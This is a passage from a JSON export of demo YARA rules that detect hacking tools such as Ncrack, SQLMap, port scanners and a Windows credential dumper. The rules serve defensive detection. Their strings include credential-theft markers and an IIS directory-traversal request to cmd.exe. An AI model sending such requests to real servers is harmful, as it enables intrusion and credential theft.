\"2014-01-07 09:40:01\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1110\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"NcrackOutputTable only supports adding up to 4096 to a cell via\" \n   condition: \n      1 of them\n}","date":"2014-01-07 09:40:01","description":"This signature detects the Ncrack brute force tool","minimum_yara":"1.7","name":"HKTL_Ncrack_RID2AF5","reference":"-","required_modules":[],"rule_hash":"04c1aa622882a460c8dbc8b58180f540","score":60,"tags":["DEMO","T1110","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_SQLMap_RID2AB1 : DEMO HKTL {\n   meta:\n      description = \"This signature detects the SQLMap SQL injection tool\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 07:46:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"except SqlmapBaseException, ex:\" \n   condition: \n      1 of them\n}","date":"2014-01-07 07:46:41","description":"This signature detects the SQLMap SQL injection tool","minimum_yara":"1.7","name":"HKTL_SQLMap_RID2AB1","reference":"-","required_modules":[],"rule_hash":"98e627b7d61a419bf070a77bb567a129","score":60,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_PortScanner_RID2D12 : DEMO HKTL {\n   meta:\n      description = \"Semiautomatic generated rule on file PortScanner.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 10:16:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Scan Ports Every\" \n      $s3 = \"Scan All Possible Ports!\" \n   condition: \n      all of them\n}","date":"2014-01-07 10:16:11","description":"Semiautomatic generated rule on file PortScanner.exe","minimum_yara":"1.7","name":"HKTL_PortScanner_RID2D12","reference":"-","required_modules":[],"rule_hash":"72ce56115aee4b2f7b5ddaa5456d7607","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_MooreR_Port_Scanner_RID3024 : DEMO HKTL T1046 {\n   meta:\n      description = \"Semiautomatic generated rule on file MooreR Port Scanner.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 12:27:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1046\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Description|\" \n      $s3 = \"soft Visual Studio\\\\VB9yp\" \n      $s4 = \"adj_fptan?4\" \n      $s7 = \"DOWS\\\\SyMem32\\\\/o\" \n   condition: \n      all of them\n}","date":"2014-01-07 12:27:11","description":"Semiautomatic generated rule on file MooreR Port Scanner.exe","minimum_yara":"1.7","name":"HKTL_MooreR_Port_Scanner_RID3024","reference":"-","required_modules":[],"rule_hash":"e8a0331b3bcf64192e0fdc7db45b1cbb","score":75,"tags":["DEMO","T1046","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_NetBIOS_Name_Scanner_RID3000 : DEMO HKTL {\n   meta:\n      description = \"Semiautomatic generated rule on file NetBIOS Name Scanner.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 12:21:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"IconEx\" \n      $s2 = \"soft Visual Stu\" \n      $s4 = \"NBTScanner!y&\" \n   condition: \n      all of them\n}","date":"2014-01-07 12:21:11","description":"Semiautomatic generated rule on file NetBIOS Name Scanner.exe","minimum_yara":"1.7","name":"HKTL_NetBIOS_Name_Scanner_RID3000","reference":"-","required_modules":[],"rule_hash":"47b535d5740e272c7324152bb91a361b","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_FeliksPack3___Scanners_ipscan_RID33EA : DEMO HKTL {\n   meta:\n      description = \"Semiautomatic generated rule on file ipscan.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 15:08:11\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s2 = \"WCAP;}ECTED\" \n      $s4 = \"NotSupported\" \n      $s6 = \"SCAN.VERSION{_\" \n   condition: \n      all of them\n}","date":"2014-01-07 15:08:11","description":"Semiautomatic generated rule on file ipscan.exe","minimum_yara":"1.7","name":"HKTL_FeliksPack3___Scanners_ipscan_RID33EA","reference":"-","required_modules":[],"rule_hash":"3824246c1082abffdff1b7d35554448e","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_CGISscan_CGIScan_RID2E25 : DEMO HKTL {\n   meta:\n      description = \"Semiautomatic generated rule on file CGIScan.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 11:02:01\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Wang Products\" fullword wide\n      $s2 = \"WSocketResolveHost: Cannot convert host address '%s'\" \n      $s3 = \"tcp is the only protocol supported thru socks server\" \n   condition: \n      all of ( $s* )\n}","date":"2014-01-07 11:02:01","description":"Semiautomatic generated rule on file CGIScan.exe","minimum_yara":"1.7","name":"HKTL_CGISscan_CGIScan_RID2E25","reference":"-","required_modules":[],"rule_hash":"a40c46c59696d4103a7748b0b93d9d05","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_IP_Stealing_Utilities_RID30ED : DEMO HKTL {\n   meta:\n      description = \"Semiautomatic generated rule on file IP Stealing Utilities.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 13:00:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"DarkKnight\" \n      $s9 = \"IPStealerUtilities\" \n   condition: \n      all of them\n}","date":"2014-01-07 13:00:41","description":"Semiautomatic generated rule on file IP Stealing Utilities.exe","minimum_yara":"1.7","name":"HKTL_IP_Stealing_Utilities_RID30ED","reference":"-","required_modules":[],"rule_hash":"367b0b4c66b040c6f45215ea17045e90","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_PortRacer_RID2C35 : DEMO HKTL {\n   meta:\n      description = \"Semiautomatic generated rule on file PortRacer.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 09:39:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Auto Scroll BOTH Text Boxes\" \n      $s4 = \"Start/Stop Portscanning\" \n      $s6 = \"Auto Save LogFile by pressing STOP\" \n   condition: \n      all of them\n}","date":"2014-01-07 09:39:21","description":"Semiautomatic generated rule on file PortRacer.exe","minimum_yara":"1.7","name":"HKTL_PortRacer_RID2C35","reference":"-","required_modules":[],"rule_hash":"a35418145e60d16c183ece3ceba8b278","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_scanarator_RID2CD1 : DEMO HKTL {\n   meta:\n      description = \"Semiautomatic generated rule on file scanarator.exe\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2014-01-07 10:05:21\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s4 = \"GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir HTTP/1.0\" \n   condition: \n      all of them\n}","date":"2014-01-07 10:05:21","description":"Semiautomatic generated rule on file scanarator.exe","minimum_yara":"1.7","name":"HKTL_scanarator_RID2CD1","reference":"-","required_modules":[],"rule_hash":"87c4e398ff13b8b2031b190d9e359147","score":75,"tags":["DEMO","HKTL"]},{"author":"Florian Roth","content":"rule HKTL_Amplia_Security_Tool_RID30AB : DEMO HKTL SUSP T1003 {\n   meta:\n      description = \"Detects Amplia Security Tool like Windows Credential Editor\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2013-01-01 12:49:41\"\n      score = 60\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      nodeepdive = \"1\"\n      tags = \"DEMO, HKTL, SUSP, T1003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a = \"Amplia Security\" \n      $c = \"getlsasrvaddr.exe\" \n      $d = \"Cannot get PID of LSASS.EXE\" \n      $e = \"extract the TGT session key\" \n      $f = \"PPWDUMP_DATA\" \n   condition: \n      1 of them\n}","date":"2013-01-01 12:49:41","description":"Detects Amplia Security Tool like Windows Credential Editor","minimum_yara":"1.7","name":"HKTL_Amplia_Security_Tool_RID30AB","reference":"-","required_modules":[],"rule_hash":"9b1a75a703b0f2ce629b8cae55b6594a","score":60,"tags":["SUSP","DEMO","T1003","HKTL"]}],"title":"VALHALLA YARA RULE SET - DEMO"}
